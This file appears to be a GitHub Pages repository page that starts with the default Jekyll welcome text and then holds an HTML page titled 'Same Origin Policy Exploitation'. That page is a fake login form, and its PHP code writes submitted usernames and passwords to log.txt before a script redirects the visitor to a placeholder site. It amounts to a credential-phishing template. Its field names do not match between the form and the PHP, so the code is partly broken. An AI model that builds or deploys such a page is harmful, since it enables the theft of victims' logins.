## Welcome to GitHub Pages

You can use the [editor on GitHub](https://github.com/MaxPlagues/CORS-SOP/edit/master/index.md) to maintain and preview the content for your website in Markdown files.

Whenever you commit to this repository, GitHub Pages will run [Jekyll](https://jekyllrb.com/) to rebuild the pages in your site, from the content in your Markdown files.

### Markdown

Markdown is a lightweight and easy-to-use syntax for styling your writing. It includes conventions for

```markdown
Syntax highlighted code block

# Header 1
## Header 2
### Header 3

- Bulleted
- List

1. Numbered
2. List

**Bold** and _Italic_ and `Code` text

[Link](url) and ![Image](src)
```

For more details see [GitHub Flavored Markdown](https://guides.github.com/features/mastering-markdown/).

### Jekyll Themes

Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/MaxPlagues/CORS-SOP/settings). The name of this theme is saved in the Jekyll `_config.yml` configuration file.

### Support or Contact

Having trouble with Pages? Check out our [documentation](https://help.github.com/categories/github-pages-basics/) or [contact support](https://github.com/contact) and we’ll help you sort it out.







<!DOCTYPE html>
	<html>
		<head>
			<h1 style="text-align:center;">Same Origin Policy</h1>
			<h2 style="text-align:center;"><i>Exploitation</i></h2>
				<meta name="viewport" content="width=device-width, initial-scale=1">
			

	<style>
		body {font-family: Arial, Helvetica, sans-serif;}

		/* Full-width input fields */
		input[type=text], input[type=password] {
   			width: 100%;
    		padding: 12px 20px;
    		margin: 8px 0;
    		display: inline-block;
    		border: 1px solid #ccc;
    		box-sizing: border-box; 
		}

		/* Set a style for all buttons */
		button {
   			background-color: #ff9933;
    		color: white;
    		padding: 14px 20px;
    		margin: 8px 0;
    		border: none;
    		cursor: pointer;
    		width: 100%;
		}

		button:hover {
    		opacity: 0.8;
		}

		/* Extra styles for the cancel button */
		.cancelbtn {
   			width: auto;
    		padding: 10px 18px;
    		background-color: #996600;
		}

		/* Center the image and position the close button */
		.imgcontainer {
   			text-align: center;
    		margin: 24px 0 12px 0;
    		position: relative;
		}	

		img.avatar {
    		width: 40%;
    		border-radius: 50%;
		}

		.container {
    		padding: 16px;
		}

		span.psw {
    		float: right;
    		padding-top: 16px;
		}

		/* The Modal (background) */
		.modal {
    		display: none; /* Hidden by default */
    		position: fixed; /* Stay in place */
    		z-index: 1; /* Sit on top */
    		left: 0;
    		top: 0;
    		width: 100%; /* Full width */
    		height: 100%; /* Full height */
    		overflow: auto; /* Enable scroll if needed */
    		background-color: rgb(0,0,0); /* Fallback color */
    		background-color: rgba(0,0,0,0.4); /* Black w/ opacity */
    		padding-top: 60px;
		}

		/* Modal Content/Box */
		.modal-content {
    		background-color: #fefefe;
    		margin: 5% auto 15% auto; /* 5% from the top, 15% from the bottom and centered */
    		border: 1px solid #888;
    		width: 80%; /* Could be more or less, depending on screen size */
		}

		/* The Close Button (x) */
		.close {
    		position: absolute;
    		right: 25px;
   			top: 0;
    		color: #000;
    		font-size: 35px;
    		font-weight: bold;
		}

		.close:hover,
		.close:focus {
    		color: red;
    		cursor: pointer;
		}

		/* Add Zoom Animation */
		.animate {
    		-webkit-animation: animatezoom 0.6s;
    		animation: animatezoom 0.6s
		}

		@-webkit-keyframes animatezoom {
    		from {-webkit-transform: scale(0)} 
    		to {-webkit-transform: scale(1)}
		}
    
		@keyframes animatezoom {
    		from {transform: scale(0)} 
    		to {transform: scale(1)}
		}

		/* Change styles for span and cancel button on extra small screens */
		@media screen and (max-width: 300px) {
    		span.psw {
       			display: block;
       			float: none;
    		}
    		.cancelbtn {
       			width: 100%;
    		}
		}
		</style>
	</head>
<body>

	<h2>Please Login Below</h2>

	<button onclick="document.getElementById('id01').style.display='block'" style="width:auto;">Login</button>

	<div id="id01" class="modal">
  
    <form class="modal-content animate" action="/action_page.php">
    <div class="imgcontainer">
    	<span onclick="document.getElementById('id01').style.display='none'" class="close" title="Exit">&times;</span>
    </div>

    <div class="container">
    	<label for="uname"><b>Username</b></label>
    	<input type="text" placeholder="Enter Username" name="uname" required>

    	<label for="psw"><b>Password</b></label>
    	<input type="password" placeholder="Enter Password" name="psw" required>
        
    	<button type="submit">Login</button>
    </div>

    <div class="container" style="background-color:#f1f1f1">
    	<button type="button" onclick="document.getElementById('id01').style.display='none'" class="cancelbtn">Cancel</button>
	</div>
  </form>
</div>

<script>

var modal = document.getElementById('id01');


window.onclick = function(event) {
    if (event.target == modal) {
        modal.style.display = "none";
    }
}
</script>

<?php

if ($_POST['Login']){

$myFile = "log.txt";
$fh = fopen($myFile, 'a') or die("can't open file");
$stringData = $_POST['username'] . ":";
fwrite($fh, $stringData);
$stringData = $_POST['password'] . "\n";
fwrite($fh, $stringData);
fclose($fh);

} ?>

<script>location.href='https://YOURWEBSITE.com';</script>
	

</body>
</html>
